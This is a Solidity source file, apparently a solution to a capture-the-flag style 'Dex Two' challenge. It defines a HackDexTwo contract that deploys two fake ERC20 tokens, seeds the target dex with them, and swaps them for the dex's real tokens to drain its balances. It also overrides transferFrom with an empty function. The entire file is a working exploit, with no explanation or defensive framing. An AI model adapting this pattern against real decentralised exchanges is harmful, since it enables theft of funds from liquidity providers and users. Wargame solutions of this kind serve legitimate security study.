// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';
import "./DexTwo.sol";


contract HackDexTwo {

    using SafeMath for uint;

    DexTwo public dex;

    constructor(address _dexAddress) public {
        dex = DexTwo(_dexAddress);
    }
    
    function hack() external {

        // Deploy fake tokens
        FakeToken fakeToken1 = new FakeToken(address(dex), address(this), "Fake Token 1", "FT1");
        FakeToken fakeToken2 = new FakeToken(address(dex), address(this), "Fake Token 2", "FT2");
        
        // Approve dex to transfer FakeToken1/2
        fakeToken1.approve(address(dex), 100);
        fakeToken2.approve(address(dex), 100);

        // Perform some malicious swaps
        dex.swap(address(fakeToken1), dex.token2(), 100);
        dex.swap(address(fakeToken2), dex.token1(), 100);
    }
}


contract FakeToken is ERC20 {

    constructor(address _dexAddress, address _hackDexAddress, string memory name, string memory symbol) public ERC20(name, symbol) {
        _mint(_hackDexAddress, 100);
        _mint(_dexAddress, 100);
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {}
}
